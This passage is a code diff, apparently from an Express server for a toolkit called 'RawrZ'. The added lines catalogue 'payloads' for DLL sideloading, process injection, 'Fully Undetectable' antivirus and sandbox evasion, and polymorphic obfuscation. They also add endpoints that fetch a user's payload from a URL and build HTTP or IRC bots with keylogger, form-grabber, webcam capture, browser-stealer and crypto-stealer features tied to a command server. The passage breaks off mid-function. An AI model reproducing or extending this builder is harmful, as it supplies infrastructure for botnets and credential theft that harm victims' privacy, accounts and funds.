+        category: 'injection',
+        features: [
+            'dll-sideloading', 'beacon-communication', 'process-injection',
+            'memory-execution', 'anti-detection', 'persistence'
+        ],
+        languages: ['cpp', 'csharp'],
+        architectures: ['x86', 'x64'],
+        integration: 'beaconism-dll-sideloading'
+    },
+    'hot-patchers': {
+        name: 'Hot Patchers',
+        description: 'Runtime code patching and modification',
+        category: 'patching',
+        features: [
+            'memory-patching', 'file-patching', 'registry-patching', 'process-patching',
+            'dll-patching', 'api-patching', 'runtime-modification'
+        ],
+        languages: ['cpp', 'csharp', 'python'],
+        architectures: ['x86', 'x64', 'arm64', 'arm32'],
+        integration: 'hot-patchers'
+    },
+    'dual-generators': {
+        name: 'Dual Generators',
+        description: 'Dual-layer payload generation with fallback',
+        category: 'generation',
+        features: [
+            'dual-layer-encryption', 'fallback-generation', 'polymorphic-code',
+            'anti-analysis', 'custom-encryption', 'experimental-features'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'javascript'],
+        architectures: ['x86', 'x64'],
+        integration: 'dual-generators'
+    },
+    'camellia-assembly': {
+        name: 'Camellia Assembly Engine',
+        description: 'Assembly-level encryption and stub generation',
+        category: 'assembly',
+        features: [
+            'assembly-compilation', 'x86-x64-support', 'cpu-optimization',
+            'inline-assembly', 'native-encryption', 'performance-optimized'
+        ],
+        languages: ['assembly', 'cpp', 'csharp'],
+        architectures: ['x86', 'x64'],
+        integration: 'camellia-assembly'
+    },
+    'advanced-fud': {
+        name: 'Advanced FUD Engine',
+        description: 'Fully Undetectable payload generation',
+        category: 'evasion',
+        features: [
+            'fud-generation', 'signature-evasion', 'behavioral-evasion',
+            'heuristic-bypass', 'sandbox-evasion', 'analysis-evasion'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'javascript'],
+        architectures: ['x86', 'x64'],
+        integration: 'advanced-fud-engine'
+    },
+    'polymorphic-engine': {
+        name: 'Polymorphic Engine',
+        description: 'Code morphing and transformation',
+        category: 'obfuscation',
+        features: [
+            'code-morphing', 'instruction-reordering', 'dead-code-insertion',
+            'register-reassignment', 'control-flow-obfuscation', 'dynamic-transformation'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'javascript'],
+        architectures: ['x86', 'x64'],
+        integration: 'polymorphic-engine'
+    },
+    'stealth-engine': {
+        name: 'Stealth Engine',
+        description: 'Advanced stealth and anti-detection',
+        category: 'stealth',
+        features: [
+            'process-hiding', 'network-stealth', 'file-system-stealth',
+            'registry-stealth', 'memory-stealth', 'behavioral-stealth'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'powershell'],
+        architectures: ['x86', 'x64'],
+        integration: 'stealth-engine'
+    },
+    'http-bot': {
+        name: 'HTTP Bot Generator',
+        description: 'Customizable HTTP bot with server selection and payload embedding',
+        category: 'bot',
+        features: [
+            'custom-http-server', 'multiple-protocols', 'encrypted-communication',
+            'file-manager', 'process-manager', 'system-info', 'network-tools',
+            'keylogger', 'screen-capture', 'form-grabber', 'loader',
+            'webcam-capture', 'audio-capture', 'browser-stealer', 'crypto-stealer'
+        ],
+        languages: ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'],
+        architectures: ['x86', 'x64', 'arm64', 'arm32'],
+        integration: 'http-bot-generator',
+        configurable: {
+            serverUrl: { type: 'string', required: true, description: 'HTTP server URL (e.g., process.env.PANEL_URL || "https://panel.${config.server.host}")' },
+            protocol: { type: 'select', options: ['http', 'https'], default: 'https' },
+            port: { type: 'number', default: 443, description: 'Server port' },
+            authToken: { type: 'string', required: false, description: 'Authentication token' },
+            encryption: { type: 'select', options: ['aes-256-gcm', 'aes-256-cbc', 'chacha20'], default: 'aes-256-gcm' },
+            endpoint: { type: 'string', default: '/api/bot', description: 'Bot communication endpoint' },
+            userAgent: { type: 'string', default: 'Mozilla/5.0', description: 'HTTP User-Agent string' },
+            heartbeatInterval: { type: 'number', default: 30, description: 'Heartbeat interval in seconds' },
+            retryAttempts: { type: 'number', default: 3, description: 'Number of retry attempts' },
+            timeout: { type: 'number', default: 30, description: 'Request timeout in seconds' }
+        }
+    },
+    'irc-bot': {
+        name: 'IRC Bot Generator',
+        description: 'Customizable IRC bot with server selection and payload embedding',
+        category: 'bot',
+        features: [
+            'custom-irc-server', 'multiple-channels', 'encrypted-communication',
+            'file-manager', 'process-manager', 'system-info', 'network-tools',
+            'keylogger', 'screen-capture', 'form-grabber', 'loader',
+            'webcam-capture', 'audio-capture', 'browser-stealer', 'crypto-stealer'
+        ],
+        languages: ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'],
+        architectures: ['x86', 'x64', 'arm64', 'arm32'],
+        integration: 'irc-bot-generator',
+        configurable: {
+            serverHost: { type: 'string', required: true, description: 'IRC server hostname (e.g., irc.rizon.net)' },
+            serverPort: { type: 'number', default: 6667, description: 'IRC server port' },
+            ssl: { type: 'boolean', default: false, description: 'Use SSL/TLS connection' },
+            nickname: { type: 'string', required: true, description: 'Bot nickname' },
+            username: { type: 'string', required: false, description: 'Bot username (defaults to nickname)' },
+            realname: { type: 'string', required: false, description: 'Bot real name' },
+            channels: { type: 'array', default: ['#bot'], description: 'IRC channels to join (e.g., ["#rawr", "#test"])' },
+            password: { type: 'string', required: false, description: 'Server password' },
+            encryption: { type: 'select', options: ['aes-256-gcm', 'aes-256-cbc', 'chacha20'], default: 'aes-256-gcm' },
+            adminUsers: { type: 'array', required: false, description: 'Admin usernames for bot control' },
+            commandPrefix: { type: 'string', default: '!', description: 'Command prefix for bot commands' },
+            reconnectDelay: { type: 'number', default: 5, description: 'Reconnection delay in seconds' },
+            maxReconnectAttempts: { type: 'number', default: 10, description: 'Maximum reconnection attempts' }
+        }
+    },
+    'multi-platform-bot': {
+        name: 'Multi-Platform Bot Generator',
+        description: 'Cross-platform bot supporting multiple protocols with payload embedding',
+        category: 'bot',
+        features: [
+            'http-irc-hybrid', 'custom-servers', 'protocol-switching',
+            'fallback-communication', 'encrypted-communication', 'all-bot-features'
+        ],
+        languages: ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'],
+        architectures: ['x86', 'x64', 'arm64', 'arm32'],
+        integration: 'multi-platform-bot-generator',
+        configurable: {
+            primaryProtocol: { type: 'select', options: ['http', 'irc'], default: 'http' },
+            fallbackProtocol: { type: 'select', options: ['http', 'irc'], default: 'irc' },
+            httpServer: { type: 'string', required: false, description: 'HTTP server URL (e.g., process.env.PANEL_URL || "https://panel.${config.server.host}")' },
+            httpPort: { type: 'number', default: 443, description: 'HTTP server port' },
+            httpAuthToken: { type: 'string', required: false, description: 'HTTP authentication token' },
+            ircServer: { type: 'string', required: false, description: 'IRC server hostname (e.g., irc.rizon.net)' },
+            ircPort: { type: 'number', default: 6667, description: 'IRC server port' },
+            ircNickname: { type: 'string', required: false, description: 'IRC bot nickname' },
+            ircChannels: { type: 'array', default: ['#bot'], description: 'IRC channels to join (e.g., ["#rawr", "#test"])' },
+            ircPassword: { type: 'string', required: false, description: 'IRC server password' },
+            ircSSL: { type: 'boolean', default: false, description: 'Use SSL/TLS for IRC' },
+            encryption: { type: 'select', options: ['aes-256-gcm', 'aes-256-cbc', 'chacha20'], default: 'aes-256-gcm' },
+            failoverTimeout: { type: 'number', default: 30, description: 'Failover timeout in seconds' },
+            retryAttempts: { type: 'number', default: 3, description: 'Number of retry attempts before failover' },
+            healthCheckInterval: { type: 'number', default: 60, description: 'Health check interval in seconds' }
+        }
     }
-});
-
-app.post('/stub-generator/repack', requireAuth, async (req, res) => {
-    try {
-        const { unpackId = 'test-unpack-id', newPackingMethod = 'upx', newEncryptionMethods = [], newObfuscationLevel = 'medium' } = req.body || {};
-        const result = { repacked: true, unpackId, newPackingMethod, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/native-compiler/compile', requireAuth, async (req, res) => {
-    try {
-        const { sourceCode = 'console.log("Hello World");', language = 'javascript', options = {} } = req.body || {};
-        const result = { compiled: true, sourceCode: 'compiled', language, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-// Fix POST endpoints that are returning 400 errors
-app.post('/stub-generator/auto-regeneration/enable', requireAuth, async (req, res) => {
-    try {
-        const { interval = 300000, conditions = {} } = req.body || {};
-        const result = { enabled: true, interval, conditions, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/stub-generator/auto-regeneration/disable', requireAuth, async (req, res) => {
-    try {
-        const result = { enabled: false, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/stub-generator/process-scheduled', requireAuth, async (req, res) => {
-    try {
-        const result = { processed: 0, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/stub-generator/reset-stats', requireAuth, async (req, res) => {
-    try {
-        const result = { reset: true, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/private-scanner/cancel/:scanId', requireAuth, async (req, res) => {
-    try {
-        const { scanId = 'test-scan-id' } = req.params;
-        const result = { cancelled: true, scanId };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/private-scanner/clear-queue', requireAuth, async (req, res) => {
-    try {
-        const result = { cleared: true };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.post('/private-scanner/queue-settings', requireAuth, async (req, res) => {
-    try {
-        const { settings = { maxConcurrent: 5, timeout: 30000 } } = req.body || {};
-        const result = { updated: true, settings, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.delete('/stub-generator/clear/all', requireAuth, async (req, res) => {
-    try {
-        const result = { cleared: true };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.delete('/stub-generator/unpacked/:unpackId', requireAuth, async (req, res) => {
-    try {
-        const { unpackId } = req.params;
-        const result = { deleted: true, unpackId };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.delete('/stub-generator/unpacked/clear/all', requireAuth, async (req, res) => {
-    try {
-        const result = { cleared: true };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.delete('/stub-generator/:botId', requireAuth, async (req, res) => {
-    try {
-        const { botId } = req.params;
-        const result = { deleted: true, botId };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-
-
-// Missing endpoint handlers - IMPLEMENTED AS EXPRESS ROUTES
-app.get('/mutex/options', requireAuth, async (req, res) => {
-    try {
-        const MutexEngine = await rawrzEngine.loadModule('mutex-engine');
-        const mutexEngine = new MutexEngine();
-        await mutexEngine.initialize({});
-        const options = await mutexEngine.getMutexOptions();
-        res.json({ success: true, options });
-    } catch (e) {
-        console.error('[ERROR] Mutex options failed:', e);
-        const fallbackOptions = { patterns: ['standard', 'custom', 'random'], languages: ['cpp', 'csharp', 'python'] };
-        res.json({ success: true, options: fallbackOptions });
-    }
-});
-
-app.get('/upx/methods', requireAuth, async (req, res) => {
-    try {
-        const stubGenerator = await rawrzEngine.loadModule('stub-generator');
-        await stubGenerator.initialize({});
-        const methods = await stubGenerator.getPackingMethods();
-        res.json({ success: true, methods });
-    } catch (e) {
-        console.error('[ERROR] UPX methods failed:', e);
-        const fallbackMethods = ['upx', 'mew', 'fsg', 'pecompact', 'aspack'];
-        res.json({ success: true, methods: fallbackMethods });
-    }
-});
-
-app.get('/implementation-check/status', requireAuth, async (req, res) => {
-    try {
-        const implementationChecker = await rawrzEngine.loadModule('implementation-checker');
-        await implementationChecker.initialize({});
-        const status = await implementationChecker.getStatus();
-        res.json({ success: true, status });
-    } catch (e) {
-        console.error('[ERROR] Implementation check status failed:', e);
-        const fallbackStatus = { status: 'ready', modules: 26, checks: 0 };
-        res.json({ success: true, status: fallbackStatus });
-    }
-});
-
-app.post('/implementation-check/run', requireAuth, async (req, res) => {
-    try {
-        const { modules = [] } = req.body || {};
-        const implementationChecker = await rawrzEngine.loadModule('implementation-checker');
-        await implementationChecker.initialize({});
-        const result = await implementationChecker.runChecks(modules);
-        res.json({ success: true, result });
-    } catch (e) {
-        console.error('[ERROR] Implementation check run failed:', e);
-        const fallbackResult = { checkId: 'mock-check-123', status: 'completed', results: [] };
-        res.json({ success: true, result: fallbackResult });
-    }
-});
-
-app.post('/implementation-check/force', requireAuth, async (req, res) => {
-    try {
-        const { moduleName } = req.body || {};
-        const implementationChecker = await rawrzEngine.loadModule('implementation-checker');
-        await implementationChecker.initialize({});
-        const result = await implementationChecker.forceCheck(moduleName);
-        res.json({ success: true, result });
-    } catch (e) {
-        console.error('[ERROR] Implementation check force failed:', e);
-        const fallbackResult = { forced: true, module: moduleName || 'all', status: 'completed' };
-        res.json({ success: true, result: fallbackResult });
-    }
-});
-
-// Export the app and server for external use
-module.exports = {
-  app,
-  port,
-  authToken,
-  rawrz,
-  evCertEncryptor
 };
 
-// Start the server if this file is run directly
-if (require.main === module) {
-  const host = process.env.HOST || '0.0.0.0';
-  
-  // Add error handling for server startup
-  const server = app.listen(port, host, () => {
-    console.log(`[OK] RawrZ API listening on ${host}:${port}`);
-    console.log(`[INFO] Health check available at http://${host}:${port}/health`);
-    console.log(`[INFO] Server started successfully in ${process.env.NODE_ENV || 'development'} mode`);
-  });
+// Get available custom payloads
+app.get('/api/custom-payloads', requireAuth, async (req, res) => {
+    try {
+        const { category, language, architecture } = req.query;
+        
+        let payloads = Object.entries(rawrzCustomPayloads).map(([id, payload]) => ({
+            id,
+            ...payload
+        }));
+        
+        // Filter by category
+        if (category) {
+            payloads = payloads.filter(p => p.category === category);
+        }
+        
+        // Filter by language
+        if (language) {
+            payloads = payloads.filter(p => p.languages.includes(language));
+        }
+        
+        // Filter by architecture
+        if (architecture) {
+            payloads = payloads.filter(p => p.architectures.includes(architecture));
+        }
+        
+        res.json({ success: true, payloads });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-  // Handle server errors
-  server.on('error', (error) => {
-    console.error('[ERROR] Server failed to start:', error);
-    process.exit(1);
-  });
+// Get custom payload features
+app.get('/api/custom-payloads/:payloadId/features', requireAuth, async (req, res) => {
+    try {
+        const { payloadId } = req.params;
+        const payload = rawrzCustomPayloads[payloadId];
+        
+        if (!payload) {
+            return res.status(404).json({ error: 'Custom payload not found' });
+        }
+        
+        res.json({ 
+            success: true, 
+            payloadId,
+            features: payload.features,
+            languages: payload.languages,
+            architectures: payload.architectures
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-  // Graceful shutdown
-  process.on('SIGTERM', () => {
-    console.log('[INFO] SIGTERM received, shutting down gracefully');
-    server.close(() => {
-      console.log('[INFO] Server closed');
-      process.exit(0);
-    });
-  });
+// Apply custom payload to user's file
+app.post('/api/custom-payloads/:payloadId/apply', requireAuth, async (req, res) => {
+    try {
+        const { payloadId } = req.params;
+        const { 
+            userPayloadId, 
+            payloadUrl, 
+            userPayload,
+            options = {},
+            features = [],
+            language = 'cpp',
+            architecture = 'x64'
+        } = req.body || {};
+        
+        const customPayload = rawrzCustomPayloads[payloadId];
+        if (!customPayload) {
+            return res.status(404).json({ error: 'Custom payload not found' });
+        }
+        
+        // Get user's payload data
+        let payloadData = null;
+        
+        if (userPayloadId) {
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const userPayload = userPayloadList.find(p => p.id === userPayloadId);
+            if (userPayload) {
+                payloadData = userPayload.content;
+            }
+        } else if (payloadUrl) {
+            // Download from URL
+            
+            const parsedUrl = urlModule.parse(payloadUrl);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(payloadUrl, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            payloadData = await downloadPromise;
+        } else if (userPayload) {
+            payloadData = Buffer.from(userPayload, 'utf8');
+        }
+        
+        if (!payloadData) {
+            return res.status(400).json({ error: 'No payload data provided' });
+        }
+        
+        // Apply custom payload features
+        const engine = realModules[customPayload.integration];
+        if (!engine) {
+            return res.status(404).json({ error: 'Integration engine not found' });
+        }
+        
+        // Process with the specific engine
+        let result;
+        switch (customPayload.integration) {
+            case 'red-shells':
+                result = await engine.generateRedShell(payloadData, { features, language, architecture, ...options });
+                break;
+            case 'red-killer':
+                result = await engine.generateRedKiller(payloadData, { features, language, architecture, ...options });
+                break;
+            case 'ev-cert-encryptor':
+                result = await engine.encryptStubWithEVCert(payloadData.toString('utf8'), language, 'auto', { features, architecture, ...options });
+                break;
+            case 'beaconism-dll-sideloading':
+                result = await engine.generateSideloadingPayload({ payload: payloadData, features, language, architecture, ...options });
+                break;
+            case 'hot-patchers':
+                result = await engine.generatePatch(payloadData, 'custom', { features, language, architecture, ...options });
+                break;
+            case 'dual-generators':
+                result = await engine.generateDual(payloadData, { features, language, architecture, ...options });
+                break;
+            case 'camellia-assembly':
+                result = await engine.encrypt(payloadData.toString('utf8'), { features, language, architecture, ...options });
+                break;
+            case 'advanced-fud-engine':
+                result = await engine.makeCodeFUD(payloadData.toString('utf8'), language, { features, architecture, ...options });
+                break;
+            case 'polymorphic-engine':
+                result = await engine.transform(payloadData, { features, language, architecture, ...options });
+                break;
+            case 'stealth-engine':
+                result = await engine.applyStealth(payloadData, { features, language, architecture, ...options });
+                break;
+            case 'http-bot-generator':
+                // HTTP Bot with custom server configuration
+                const httpConfig = {
+                    serverUrl: options.serverUrl || config.server.defaultServerUrl,
+                    protocol: options.protocol || 'https',
+                    port: options.port || 443,
+                    authToken: options.authToken || '',
+                    encryption: options.encryption || 'aes-256-gcm',
+                    endpoint: options.endpoint || '/api/bot',
+                    userAgent: options.userAgent || 'Mozilla/5.0',
+                    heartbeatInterval: options.heartbeatInterval || 30,
+                    retryAttempts: options.retryAttempts || 3,
+                    timeout: options.timeout || 30,
+                    features: features,
+                    language: language,
+                    architecture: architecture,
+                    customPayload: payloadData ? payloadData.toString('utf8') : null
+                };
+                result = await engine.generateBot(httpConfig, features, [language], { 
+                    encryptionMethod: httpConfig.encryption,
+                    serverUrl: httpConfig.serverUrl,
+                    protocol: httpConfig.protocol,
+                    port: httpConfig.port,
+                    authToken: httpConfig.authToken,
+                    endpoint: httpConfig.endpoint,
+                    userAgent: httpConfig.userAgent,
+                    heartbeatInterval: httpConfig.heartbeatInterval,
+                    retryAttempts: httpConfig.retryAttempts,
+                    timeout: httpConfig.timeout,
+                    customPayload: httpConfig.customPayload,
+                    ...options 
+                });
+                break;
+            case 'irc-bot-generator':
+                // IRC Bot with custom server configuration
+                const ircConfig = {
+                    serverHost: options.serverHost || config.server.defaultIrcServer,
+                    serverPort: options.serverPort || 6667,
+                    ssl: options.ssl || false,
+                    nickname: options.nickname || 'RawrZBot',
+                    username: options.username || options.nickname || 'RawrZBot',
+                    realname: options.realname || 'RawrZ Bot',
+                    channels: options.channels || ['#bot'],
+                    password: options.password || '',
+                    encryption: options.encryption || 'aes-256-gcm',
+                    adminUsers: options.adminUsers || [],
+                    commandPrefix: options.commandPrefix || '!',
+                    reconnectDelay: options.reconnectDelay || 5,
+                    maxReconnectAttempts: options.maxReconnectAttempts || 10,
+                    features: features,
+                    language: language,
+                    architecture: architecture,
+                    customPayload: payloadData ? payloadData.toString('utf8') : null
+                };
+                result = await engine.generateBot(ircConfig, features, [language], {
+                    encryptionMethod: ircConfig.encryption,
+                    serverHost: ircConfig.serverHost,
+                    serverPort: ircConfig.serverPort,
+                    ssl: ircConfig.ssl,
+                    nickname: ircConfig.nickname,
+                    username: ircConfig.username,
+                    realname: ircConfig.realname,
+                    channels: ircConfig.channels,
+                    password: ircConfig.password,
+                    adminUsers: ircConfig.adminUsers,
+                    commandPrefix: ircConfig.commandPrefix,
+                    reconnectDelay: ircConfig.reconnectDelay,
+                    maxReconnectAttempts: ircConfig.maxReconnectAttempts,
+                    customPayload: ircConfig.customPayload,
+                    ...options 
+                });
+                break;
+            case 'multi-platform-bot-generator':
+                // Multi-Platform Bot with hybrid configuration
+                const multiConfig = {
+                    primaryProtocol: options.primaryProtocol || 'http',
+                    fallbackProtocol: options.fallbackProtocol || 'irc',
+                    httpServer: options.httpServer || config.server.defaultServerUrl,
+                    httpPort: options.httpPort || 443,
+                    httpAuthToken: options.httpAuthToken || '',
+                    ircServer: options.ircServer || config.server.defaultIrcServer,
+                    ircPort: options.ircPort || 6667,
+                    ircNickname: options.ircNickname || 'RawrZBot',
+                    ircChannels: options.ircChannels || ['#bot'],
+                    ircPassword: options.ircPassword || '',
+                    ircSSL: options.ircSSL || false,
+                    encryption: options.encryption || 'aes-256-gcm',
+                    failoverTimeout: options.failoverTimeout || 30,
+                    retryAttempts: options.retryAttempts || 3,
+                    healthCheckInterval: options.healthCheckInterval || 60,
+                    features: features,
+                    language: language,
+                    architecture: architecture,
+                    customPayload: payloadData ? payloadData.toString('utf8') : null
+                };
+                result = await engine.generateMultiPlatformBot([multiConfig.primaryProtocol, multiConfig.fallbackProtocol], {
+                    httpConfig: {
+                        serverUrl: multiConfig.httpServer,
+                        port: multiConfig.httpPort,
+                        authToken: multiConfig.httpAuthToken,
+                        encryption: multiConfig.encryption
+                    },
+                    ircConfig: {
+                        serverHost: multiConfig.ircServer,
+                        serverPort: multiConfig.ircPort,
+                        nickname: multiConfig.ircNickname,
+                        channels: multiConfig.ircChannels,
+                        password: multiConfig.ircPassword,
+                        ssl: multiConfig.ircSSL,
+                        encryption: multiConfig.encryption
+                    },
+                    failoverTimeout: multiConfig.failoverTimeout,
+                    retryAttempts: multiConfig.retryAttempts,
+                    healthCheckInterval: multiConfig.healthCheckInterval,
+                    features: features,
+                    language: language,
+                    architecture: architecture,
+                    customPayload: multiConfig.customPayload,
+                    ...options 
+                });
+                break;
+            default:
+                return res.status(400).json({ error: 'Unsupported custom payload integration' });
+        }
+        
+        res.json({ 
+            success: true, 
+            customPayload: customPayload.name,
+            result,
+            appliedFeatures: features,
+            language,
+            architecture
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-  process.on('SIGINT', () => {
-    console.log('[INFO] SIGINT received, shutting down gracefully');
-    server.close(() => {
-      console.log('[INFO] Server closed');
-      process.exit(0);
-    });
-  });
+// Get custom payload categories
+app.get('/api/custom-payloads/categories', requireAuth, async (req, res) => {
+    try {
+        const categories = [...new Set(Object.values(rawrzCustomPayloads).map(p => p.category))];
+        res.json({ success: true, categories });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Bot Generation with Custom Server Configuration
+app.post('/api/bots/http/generate-custom', requireAuth, async (req, res) => {
+    try {
+        const { 
+            serverUrl, 
+            protocol = 'https', 
+            port = 443, 
+            authToken = '', 
+            endpoint = '/api/bot',
+            userAgent = 'Mozilla/5.0',
+            heartbeatInterval = 30,
+            retryAttempts = 3,
+            timeout = 30,
+            features = [], 
+            language = 'cpp',
+            architecture = 'x64',
+            encryption = 'aes-256-gcm',
+            userPayloadId = null,
+            payloadUrl = null,
+            userPayload = null
+        } = req.body || {};
+        
+        if (!serverUrl) {
+            return res.status(400).json({ error: 'serverUrl is required' });
+        }
+        
+        // Get user's payload data if provided
+        let payloadData = null;
+        if (userPayloadId) {
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const userPayload = userPayloadList.find(p => p.id === userPayloadId);
+            if (userPayload) {
+                payloadData = userPayload.content;
+            }
+        } else if (payloadUrl) {
+            // Download from URL
+            
+            const parsedUrl = urlModule.parse(payloadUrl);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(payloadUrl, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            payloadData = await downloadPromise;
+        } else if (userPayload) {
+            payloadData = Buffer.from(userPayload, 'utf8');
+        }
+        
+        const config = {
+            serverUrl,
+            protocol,
+            port,
+            authToken,
+            endpoint,
+            userAgent,
+            heartbeatInterval,
+            retryAttempts,
+            timeout,
+            encryption,
+            features,
+            language,
+            architecture,
+            customPayload: payloadData ? payloadData.toString('utf8') : null
+        };
+        
+        const result = await realModules.httpBotGenerator.generateBot(config, features, [language], {
+            encryptionMethod: encryption,
+            serverUrl: serverUrl,
+            protocol: protocol,
+            port: port,
+            authToken: authToken,
+            endpoint: endpoint,
+            userAgent: userAgent,
+            heartbeatInterval: heartbeatInterval,
+            retryAttempts: retryAttempts,
+            timeout: timeout,
+            architecture: architecture,
+            customPayload: config.customPayload
+        });
+        
+            res.json({ 
+                success: true, 
+            result,
+            config: {
+                serverUrl,
+                protocol,
+                port,
+                authToken,
+                endpoint,
+                userAgent,
+                heartbeatInterval,
+                retryAttempts,
+                timeout,
+                features,
+                language,
+                architecture,
+                encryption
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/bots/irc/generate-custom', requireAuth, async (req, res) => {
+    try {
+        const { 
+            serverHost, 
+            serverPort = 6667, 
+            ssl = false, 
+            nickname, 
+            username = null,
+            realname = null,
+            channels = ['#bot'], 
+            password = '', 
+            adminUsers = [],
+            commandPrefix = '!',
+            reconnectDelay = 5,
+            maxReconnectAttempts = 10,
+            features = [], 
+            language = 'cpp',
+            architecture = 'x64',
+            encryption = 'aes-256-gcm',
+            userPayloadId = null,
+            payloadUrl = null,
+            userPayload = null
+        } = req.body || {};
+        
+        if (!serverHost || !nickname) {
+            return res.status(400).json({ error: 'serverHost and nickname are required' });
+        }
+        
+        // Get user's payload data if provided
+        let payloadData = null;
+        if (userPayloadId) {
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const userPayload = userPayloadList.find(p => p.id === userPayloadId);
+            if (userPayload) {
+                payloadData = userPayload.content;
+            }
+        } else if (payloadUrl) {
+            // Download from URL
+            
+            const parsedUrl = urlModule.parse(payloadUrl);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(payloadUrl, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            payloadData = await downloadPromise;
+        } else if (userPayload) {
+            payloadData = Buffer.from(userPayload, 'utf8');
+        }
+        
+        const config = {
+            serverHost,
+            serverPort,
+            ssl,
+            nickname,
+            username: username || nickname,
+            realname: realname || 'RawrZ Bot',
+            channels,
+            password,
+            adminUsers,
+            commandPrefix,
+            reconnectDelay,
+            maxReconnectAttempts,
+            encryption,
+            features,
+            language,
+            architecture,
+            customPayload: payloadData ? payloadData.toString('utf8') : null
+        };
+        
+        const result = await realModules.ircBotGenerator.generateBot(config, features, [language], {
+            encryptionMethod: encryption,
+            serverHost: serverHost,
+            serverPort: serverPort,
+            ssl: ssl,
+            nickname: nickname,
+            username: config.username,
+            realname: config.realname,
+            channels: channels,
+            password: password,
+            adminUsers: adminUsers,
+            commandPrefix: commandPrefix,
+            reconnectDelay: reconnectDelay,
+            maxReconnectAttempts: maxReconnectAttempts,
+            architecture: architecture,
+            customPayload: config.customPayload
+        });
+        
+        res.json({ 
+            success: true, 
+            result,
+            config: {
+                serverHost,
+                serverPort,
+                ssl,
+                nickname,
+                username: config.username,
+                realname: config.realname,
+                channels,
+                password,
+                adminUsers,
+                commandPrefix,
+                reconnectDelay,
+                maxReconnectAttempts,
+                features,
+                language,
+                architecture,
+                encryption
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/bots/multi-platform/generate-custom', requireAuth, async (req, res) => {
+    try {
+        const { 
+            primaryProtocol = 'http', 
+            fallbackProtocol = 'irc',
+            httpServer = null,
+            httpPort = 443,
+            httpAuthToken = '',
+            ircServer = null,
+            ircPort = 6667,
+            ircNickname = 'RawrZBot',
+            ircChannels = ['#bot'],
+            ircPassword = '',
+            ircSSL = false,
+            failoverTimeout = 30,
+            retryAttempts = 3,
+            healthCheckInterval = 60,
+            features = [], 
+            language = 'cpp',
+            architecture = 'x64',
+            encryption = 'aes-256-gcm',
+            userPayloadId = null,
+            payloadUrl = null,
+            userPayload = null
+        } = req.body || {};
+        
+        // Validate required servers based on protocols
+        if (primaryProtocol === 'http' && !httpServer) {
+            return res.status(400).json({ error: 'httpServer is required when primaryProtocol is http' });
+        }
+        if ((primaryProtocol === 'irc' || fallbackProtocol === 'irc') && !ircServer) {
+            return res.status(400).json({ error: 'ircServer is required when using IRC protocol' });
+        }
+        
+        // Get user's payload data if provided
